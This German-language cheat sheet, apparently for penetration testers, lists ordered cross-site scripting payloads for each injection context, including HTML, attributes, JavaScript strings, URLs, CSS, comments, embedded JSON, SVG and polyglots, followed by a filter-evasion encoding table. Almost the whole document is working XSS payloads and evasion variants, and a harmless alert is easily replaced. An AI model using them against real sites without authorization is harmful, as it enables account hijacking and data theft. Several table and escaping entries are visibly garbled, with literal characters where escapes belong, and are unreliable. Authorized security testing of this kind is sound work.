# Payload-Leitern pro Kontext

Konvention: `MARKER` = `alert('DX_XSS@'+location.origin)` (Origin-Beweis). Leitern von oben nach unten abarbeiten; pro Stufe Response-Diagnose (was wurde gefiltert?) bevor die nächste Stufe kommt. Interaktionspflichtige Varianten (Klick/Hover) sind schwächer — immer erst die autoführenden Stufen.

## 1. HTML-Body

1. `<img src=x onerror=MARKER>`
2. `<svg onload=MARKER>`
3. `<svg><animate onbegin=MARKER attributeName=x>`
4. `<details open ontoggle=MARKER>`
5. `<input autofocus onfocus=MARKER>`
6. `<video><source onerror=MARKER>`
7. `<marquee onstart=MARKER>`
8. `<iframe srcdoc="&lt;img src=x onerror=MARKER&gt;">`
9. `<a href="javascript:MARKER">klick</a>` (braucht Klick — als letzte Stufe)
10. `<select autofocus onfocus=MARKER>` / `<textarea autofocus onfocus=MARKER>`
11. `<body onpageshow=MARKER>` (nur wenn komplettes Dokument kontrolliert)

## 2. Attribut, doppelt gequotet (`value="INJECTION"`)

1. `"><img src=x onerror=MARKER>`
2. `"><svg onload=MARKER>`
3. `" onfocus=MARKER autofocus x="`
4. `" onpointerover=MARKER x="` (Hover statt Klick)
5. `" onclick=MARKER x="` (Klick — letzte Stufe)
6. Wenn Attribut `href` ist: `javascript:MARKER`
7. Entities-Test: `&quot;><img src=x onerror=MARKER>` (wenn Server/Template dekodiert)

## 3. Attribut, einfach gequotet / unquoted

- Single: `' onfocus=MARKER autofocus x='` · `'><svg onload=MARKER>`
- Unquoted: `x onfocus=MARKER autofocus x=` · `x><svg onload=MARKER>` (Leerzeichen-Alternativen: `/`, Tab, FF)

## 4. JS-String (`var x = 'INJECTION';`)

1. `';MARKER;//`
2. `'-MARKER-'` (wenn Statements nicht erlaubt)
3. `</script><svg onload=MARKER>` (Script-Block-Ausbruch — oft vergessen)
4. `\';MARKER;//` (wenn Escape-Routine unvollständig)
5. Template-Literal-Kontext: `${MARKER}`
6. Zeilenende: `%0a` in serverseitig eingebetteten Strings, wenn Newline nicht gefiltert

## 5. URL-Kontext (href/src/action)

1. `javascript:MARKER`
2. `java\tscript:MARKER` / `java&#09;script:MARKER` (gegen Keyword-Filter)
3. `JaVaScRiPt:MARKER` (Case, nur primitive Filter)
4. `data:text/html;base64,...` — Achtung: opaque Origin, beweist NICHT die Target-Origin. Nur als Zwischenschritt nutzen, nie als Final-Beweis.
5. `vbscript:` — IE-Legacy, tot. Nicht verschwenden.

## 6. CSS/Style-Kontext

1. `</style><svg onload=MARKER>`
2. `}</style><img src=x onerror=MARKER>`
3. `expression(...)` — IE-Legacy, tot. Überspringen.

## 7. HTML-Kommentar (`<!-- INJECTION -->`)

1. `--><svg onload=MARKER>`
2. `--!><svg onload=MARKER>` (abrupt comment closing)

## 8. JSON-Blob in `<script>` (z. B. `__NEXT_DATA__`)

1. `</script><svg onload=MARKER>`
2. `</script x><svg onload=MARKER>` (gegen naive `</script>`-Filter)
3. Wenn `<` als `<` escaped wird: meist tot → Kandidat schließen ("Framework-Encoding greift"), außer ein zweiter Decode-Schritt existiert.

## 9. SVG/MathML (Namespace)

1. `<svg><a><animate attributeName=href values=javascript:MARKER /><text x=20 y=20>klick</text></a></svg>`
2. `<math href="javascript:MARKER">x</math>`
3. `<svg><use href="data:image/svg+xml,..."/>` (data:-SVG mit eingebettetem Script — Origin-Regel beachten)
4. mXSS-Kandidaten: siehe `mxss.md`

## 10. Polyglots (Multi-Kontext, wenn der Kontext unklar ist)

1. `'">--></style></script><svg onload=MARKER>`
2. Der bekannte Multi-Context-Polyglot (Gareth Heyes): `jaVasCript:/*-/*\`/*\\\`/*'/*"/**/(/* */oNcliCk=MARKER )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=MARKER//>\x3e`
3. Polyglots sind Sonden, keine Final-Payloads. Treffer → Kontext exakt bestimmen → spezifische Leiter abarbeiten.

## Encoding-Tabelle (gegen Filter)

| Zielzeichen | URL | Doppel-URL | HTML dez | HTML hex | JS-Unicode |
|---|---|---|---|---|---|
| `<` | `%3C` | `%253C` | `&lt;` | `&#x3C;` | `<` |
| `>` | `%3E` | `%253E` | `&gt;` | `&#x3E;` | `>` |
| `"` | `%22` | `%2522` | `&quot;` | `&#x22;` | `"` |
| `'` | `%27` | `%2527` | `&#39;` | `&#x27;` | `'` |
| `(` | `%28` | `%2528` | `&#40;` | `&#x28;` | — |
| Leer | `%20` | `%2520` | — | — | — |

JS-Unicode-Escapes wirken nur in JS-Kontexten. HTML-Entities nur in HTML-Kontexten. Wer das mischt, testet nichts.
